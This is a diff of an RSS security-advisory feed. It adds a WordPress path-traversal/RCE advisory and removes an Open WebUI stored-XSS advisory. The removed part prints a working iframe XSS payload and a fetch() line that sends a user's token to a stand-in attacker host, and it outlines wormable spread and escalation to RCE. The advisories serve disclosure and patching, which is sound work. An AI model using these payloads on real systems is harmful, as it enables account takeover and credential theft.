@@ -7,7 +7,56 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Tue, 22 Sep 2026 08:59:31 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 23 Sep 2026 09:02:22 +0000</lastBuildDate>
+    <item>
+      <title>[CRITICAL] WordPress/wordpress-develop — Unauthenticated path traversal in page-template resolution leading to conditional RCE (CVE-2026-87902)</title>
+      <link>https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-7hp8-65ch-5whp</link>
+      <description>CVE-2026-87902 · CVSS 9.2 (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N) · CWE-98
+
+Affected:
+- other/WordPress 7.1.0 - 7.1.1 (patched: 7.1.2)
+- other/WordPress 7.0.0 - 7.0.5 (patched: 7.0.6)
+- other/WordPress 6.9.0 - 6.9.8 (patched: 6.9.9)
+- other/WordPress 6.8.0 - 6.8.9 (patched: 6.8.10)
+- other/WordPress 6.7.0 - 6.7.8 (patched: 6.7.9)
+- other/WordPress 6.6.0 - 6.6.8 (patched: 6.6.9)
+- other/WordPress 6.5.0 - 6.5.11 (patched: 6.5.12)
+- other/WordPress 6.4.0 - 6.4.11 (patched: 6.4.12)
+- other/WordPress 6.3.0 - 6.3.11 (patched: 6.3.12)
+- other/WordPress 6.2.0 - 6.2.12 (patched: 6.2.13)
+- other/WordPress 6.1.0 - 6.1.13 (patched: 6.1.14)
+- other/WordPress 6.0.0 - 6.0.15 (patched: 6.0.16)
+- other/WordPress 5.9.0 - 5.9.17 (patched: 5.9.18)
+- other/WordPress 5.8.0 - 5.8.16 (patched: 5.8.17)
+- other/WordPress 5.7.0 - 5.7.18 (patched: 5.7.19)
+- other/WordPress 5.6.0 - 5.6.20 (patched: 5.6.21)
+- other/WordPress 5.5.0 - 5.5.21 (patched: 5.5.22)
+- other/WordPress 5.4.0 - 5.4.22 (patched: 5.4.23)
+- other/WordPress 5.3.0 - 5.3.24 (patched: 5.3.25)
+- other/WordPress 5.2.0 - 5.2.27 (patched: 5.2.28)
+- other/WordPress 5.1.0 - 5.1.25 (patched: 5.1.26)
+- other/WordPress 5.0.0 - 5.0.28 (patched: 5.0.29)
+- other/WordPress 4.9.0 - 4.9.32 (patched: 4.9.33)
+- other/WordPress 4.8.0 - 4.8.31 (patched: 4.8.32)
+- other/WordPress 4.7.0 - 4.7.36 (patched: 4.7.37)
+
+---
+
+An unauthenticated attacker can make `get_page_template()` page-template resolution include a chosen readable local `.php` file outside the active theme directories. If relevant pre-conditions for both the server environment and the active theme are met, this can lead to RCE.&#13;
+&#13;
+The pre-conditions are:&#13;
+&#13;
+* The active child or parent theme contains a top-level directory whose name starts with `page-` (e.g. `page-templates`). This affects the legacy Twenty Twelve and Twenty Fourteen themes, as well as some popular third party themes such as Neve, Hestia, and Sydney.&#13;
+* A chosen local `.php` target file exists on the server and is readable by the web server account. The well known `pearcmd.php` PEAR→RCE transition can be used for this when `register_argc_argv` is set to `On`. The official `php` image for Docker is affected, and the default cPanel configuration is affected when PHP prior to 8.5 is in use.&#13;
+&#13;
+WordPress 7.1.2 has been released containing a fix for the vulnerability, and as a courtesy to users on older branches the fix has been backported to all branches back to 4.7.&#13;
+&#13;
+Discovered and responsibly disclosed by [Robert Ressl](https://ressl.ch/).</description>
+      <guid isPermaLink="false">GHSA-7hp8-65ch-5whp</guid>
+      <category>CRITICAL</category>
+      <category>WordPress/wordpress-develop</category>
+      <pubDate>Tue, 22 Sep 2026 13:57:27 +0000</pubDate>
+    </item>
     <item>
       <title>[HIGH] espocrm/espocrm — IDOR allowing user with access to Email Account scope to steal another user's stored IMAP password from Email Account with known ID</title>
       <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-pj52-qx2q-4qfp</link>
@@ -3714,83 +3763,6 @@ The `channels.convertToTeam` REST endpoint lets any authenticated user convert a
       <category>MEDIUM</category>
       <category>RocketChat/Rocket.Chat</category>
       <pubDate>Sat, 11 Jul 2026 06:19:59 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] pip:open-webui — Open WebUI vulnerable to stored XSS via unescaped markdown token in MarkdownTokens.svelte leading to full account takeover and RCE via functions (CVE-2025-46719)</title>
-      <link>https://github.com/advisories/GHSA-9f4f-jv96-8766</link>
-      <description>CVE-2025-46719 · CVSS 7.4 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N/E:P) · CWE-79
-
-Affected:
-- pip/open-webui &lt; 0.6.6 (patched: 0.6.6)
-
----
-
-### Summary
-
-A vulnerability in the way certain html tags in chat messages are rendered allows attackers to inject JavaScript code into a chat transcript. The JavaScript code will be executed in the user's browser every time that chat transcript is opened, allowing attackers to retrieve the user's access token and gain full control over their account. Chat transcripts can be shared with other users in the same server, or with the whole open-webui community if "Enable Community Sharing" is enabled in the admin panel.
-
-If this exploit is used against an admin user, it is possible to achieve Remote Code Execution on the server where the open-webui backend is hosed. This can be done by creating a new function which contains maliicious python code.
-
-**This vulnerability also affects chat transcripts uploaded to `https://openwebui.com/c/&lt;user&gt;/&lt;chat_id&gt;`, allowing for wormable stored XSS in https://openwebui.com**
-
-### Details
-
-### Stored XSS
-
-The file https://github.com/open-webui/open-webui/blob/main/src/lib/components/chat/Messages/Markdown/MarkdownTokens.svelte#L269-L279 contains the following code:
-```TypeScript
-		{:else if token.text.includes(`&lt;iframe src="${WEBUI_BASE_URL}/api/v1/files/`)}
-			{@html `${token.text}`}
-``` 
-That code checks if a chat message has an html tag which contains the text `&lt;iframe src="${WEBUI_BASE_URL}/api/v1/files/`, and if so, it renders that html tag using `{@html}`, which is a dangerous Svelte functionality that allows text to be rendered as HTML code.
-
-Attackers can abuse this by sending a chat message with the following payload:
-`&lt;iframe src="http://localhost:8080/api/v1/files/" onload="alert(1)"&gt;&lt;/iframe&gt;`, where `http://localhost:8080` is the URL where the open-webui backend server is hosted.
-
-This will cause a JavaScript alert window to be displayed every time that chat transcript is opened.
-
-![image](https://github.com/user-attachments/assets/1e7da1f9-4154-402a-b5f1-4a50a0b4a227)
-![image](https://github.com/user-attachments/assets/f8f463c7-731a-41e0-9e75-c2747639bc5f)
-
-In a real attack scenario, instead of injecting `alert(1)` in the `onload` attribute, attackers can use the following code to steal the user's access token and send it to a server they control:
-`fetch("https://attacker.com/?token=" + localStorage.getItem("token"))`
-
-This is possible because the access token is stored inside the user's localStorage, which is accessible by JavaScript.
-
-Then, once the attacker has created a chat transcript which contains that payload, they can share that transcript with other users on the same server by clicking on the 3 dots next to the chat transcript on the left, and clicking "Share"
-
-![image](https://github.com/user-attachments/assets/200e3ab1-36d9-4d0c-a869-dd60ae112fc9)
-
-**If "Enable Community Sharing" is enabled in the admin panel. attackers can upload the infected chat transcript to https://openwebui.com/, where the Stored XSS payload will be executed**
-
-![image](https://github.com/user-attachments/assets/b9bab780-5fc2-439c-9875-d08cedadd99b)
-
-This makes the exploit a **wormable Stored XSS**. Attackers can upload an infected chat to their profile which has JavaScript code to upload a similar infected chat to the visitori's profile, share it with other members of the open-webui community, and infect their profiles as well.
-
-&lt;hr&gt;
-
-### RCE
-
-If an attacker manages to steal an admin user's token, they can then achieve RCE on the backend server by creating a function (http://localhost:5174/admin/functions), which by design allows admins to execute arbitrary python code on the backend server.
-
-The following HTTP request can be sent to the backend server to execute arbitrary python code.
-
-![image](https://github.com/user-attachments/assets/572a1594-cb39-4232-a834-efe625fd3667)
-![image](https://github.com/user-attachments/assets/c5b34773-759d-4f0d-9ed8-0b5078e24d1f)
-
-
-### PoC
-
-Attackers can abuse this by sending a chat message with the following payload:
-`&lt;iframe src="http://localhost:8080/api/v1/files/" onload="alert(1)"&gt;&lt;/iframe&gt;`, where `http://localhost:8080` is the URL where the open-webui backend server is hosted.
-
-### Impact
-
-Attackers can send a a link to a shared chat transcript to other users on the same server to take control over their accounts. They can also upload the chat to https://openwebui.com and take control over other users' accounts.</description>
-      <guid isPermaLink="false">GHSA-9f4f-jv96-8766</guid>
-      <category>HIGH</category>
-      <category>pip:open-webui</category>
-      <pubDate>Tue, 07 Jul 2026 16:50:59 +0000</pubDate>
     </item>
   </channel>
 </rss>
